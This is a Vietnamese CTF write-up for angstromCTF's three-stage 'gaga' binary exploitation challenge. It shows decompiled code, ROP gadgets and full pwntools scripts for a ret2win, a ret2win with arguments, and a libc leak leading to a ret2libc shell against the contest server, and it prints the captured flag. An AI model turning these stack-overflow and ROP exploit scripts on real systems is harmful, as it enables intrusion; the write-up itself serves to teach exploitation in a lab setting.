# angstrom - gaga
*chall này chứa 3 chall nhỏ cùng 3 file binary khác nhau*
## gaga0

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
  __gid_t rgid; // [rsp+3Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Welcome to gaga!");
  puts("This challenge is meant to guide you through an introduction to binary exploitation.");
  printf(
    "\nRight now, you are on stage0. Your goal is to redirect program control to win0, which is at address %p.\n",
    win0);
  printf("Your input: ");
  return gets(v4);
}
```
Lỗi bof rõ ràng khi chương trình k kiểm soát độ lớn dữ liệu đầu vào, và ta có hàm win, nhiệm vụ cần làm là tìm offset khoảng cách giữa input và saved rip để overwrite địa chỉ của hàm win là ta sẽ có được phần flag đầu tiên:

```python
from pwn import *
exe = ELF('gaga0', checksec=False)
payload = b"A" * 72
payload += p64(exe.sym['win0'])
# p = process(exe.path)
p = remote('challs.actf.co', 31300)
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()
```
```java
$ python3 gaga0.py
[+] Opening connection to challs.actf.co on port 31300: Done
[*] Switching to interactive mode
actf{b4by's_
[*] Got EOF while reading in interactive
$
```
## gaga1
 ```c
 void __fastcall win1(int a1, int a2)
{
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  FILE *stream; // [rsp+98h] [rbp-8h]

  if ( a1 == 0x1337 || a2 == 16705 )
  {
    stream = fopen("flag.txt", "r");
    if ( !stream )
    {
      puts("Error: missing flag.txt.");
      exit(1);
    }
    fgets(s, 128, stream);
    puts(s);
  }
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
  __gid_t rgid; // [rsp+3Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Nice!");
  puts("Now you need to call the win1 function with the correct arguments.");
  printf("Your input: ");
  return gets(v4);
}
 ```
gaga1 giống gaga0 cùng là lỗi bof. Tuy nhiên hàm win của gaga1 sẽ kiểm tra đúng 2 arg của nó rồi mới in flag ra cho mình. Cũng cách cũ, ta sẽ tìm offset rồi overwrite saved rip. Tuy nhiên cần để ý một chút với 2 tham số của hàm win:

```java
0x0000000000401236 <+0>:     endbr64
0x000000000040123a <+4>:     push   rbp
0x000000000040123b <+5>:     mov    rbp,rsp
0x000000000040123e <+8>:     sub    rsp,0xa0
0x0000000000401245 <+15>:    mov    DWORD PTR [rbp-0x94],edi
0x000000000040124b <+21>:    mov    DWORD PTR [rbp-0x98],esi
0x0000000000401251 <+27>:    cmp    DWORD PTR [rbp-0x94],0x1337
0x000000000040125b <+37>:    je     0x401269 <win1+51>
0x000000000040125d <+39>:    cmp    DWORD PTR [rbp-0x98],0x4141
````
Ta cần tìm gadget để điều khiển 2 thanh ghi edi và esi để push các tham số vào

```java
0x00000000004013b1 : pop rsi ; pop r15 ; ret
...
0x00000000004013b3 : pop rdi ; ret
```
do PIE disable nên k cần phải leak binary

```java
$ checksec gaga1
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
sau đây là script mình sử dụng

```python
from pwn import *
exe = ELF('gaga1', checksec=False)
rdi = 0x4013b3
rsi = 0x4013b1
payload = b"A" * 72
payload += p64(rdi) + p64(0x1337)
payload += p64(rsi) + p64(0x4141) + p64(0)
payload += p64(exe.sym['win1'])

# p = process(exe.path)
p = remote('challs.actf.co', 31301)
input()
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()
```
Remote đến server lấy phần 2 của flag

```java
$ python3 gaga1.py
[+] Opening connection to challs.actf.co on port 31301: Done
[*] Switching to interactive mode
actf{b4by's_f1rst_pwn!_
[*] Got EOF while reading in interactive
$
```
Nhưng mà có gì sai sai cứ tưởng flag được chia làm 3 phần chứ =))

## gaga2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
  __gid_t rgid; // [rsp+3Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  puts("Awesome! Now there's no system(), so what will you do?!");
  printf("Your input: ");
  return gets(v4);
}
```
Vẫn là bof tuy nhiên lần này ta không có hàm win nên phải tự tạo shell bằng các gadget và gọi được system("/bin/sh"). Nhưng trước tiên ta cần tìm ra địa chỉ base của libc để có thể gọi tới system(). Sau khi sử dụng pattern thì mình tìm đc offset để overwrite được rip là 72 và script dùng để leak libc như sau:

```python
payload = b"A" * 72
payload += p64(rdi) + p64(exe.got['puts'])
payload += p64(exe.sym['puts'])
payload += p64(exe.sym['main'])
```
Ta sẽ leak địa chỉ got của hàm puts (vì puts là hàm của libc), sau đó lại cho con trỏ quay về main để tiếp tục chương trình

```java
gef➤  got

GOT protection: Partial RelRO | GOT functions: 6

[0x404018] puts@GLIBC_2.2.5  →  0x7ffff7e4e420
...
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
...
0x00007ffff7dca000 0x00007ffff7dec000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
gef➤  p/x 0x7ffff7e4e420 - 0x00007ffff7dca000
$1 = 0x84420
gef➤
```
Chỉ cần lấy phần leak được rồi trừ cho 0x84420 là sẽ ra libc base. Giờ tìm các gadget cần thiết và exploit 

```java
0x00000000004013b1 : pop rsi ; pop r15 ; ret
...
0x00000000004013b3 : pop rdi ; ret
```
```python
from pwn import *
exe = ELF('gaga2', checksec=False)
libc = exe.libc
rdi = 0x00000000004012b3
rsi = 0x00000000004012b1

payload = b"A" * 72
payload += p64(rdi) + p64(exe.got['puts'])
payload += p64(exe.sym['puts'])
payload += p64(exe.sym['main'])

# p = process(exe.path)
p = remote('challs.actf.co', 31302)
input()
p.recvuntil(b': ')
p.sendline(payload)
leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = leak - 0x84420
log.info("libc: " +  hex(libc.address))

payload = b"A" * 72
payload += p64(rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(rsi) + p64(0) + p64(0)
payload += p64(libc.sym['system'])
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()
```
```java
$ python3 gaga2.py
[+] Opening connection to challs.actf.co on port 31302: Done
[*] libc: 0x7fae14e41000
[*] Switching to interactive mode
$ whoami
whoami: cannot find name for user ID 1000
$ ls
flag.txt
run
$ cat flag.txt
actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}
$
```
`flag: actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}`

*chỉ cần solve gaga2 là có flag rồi giải 2 cái đầu chi cho tốn công :v*
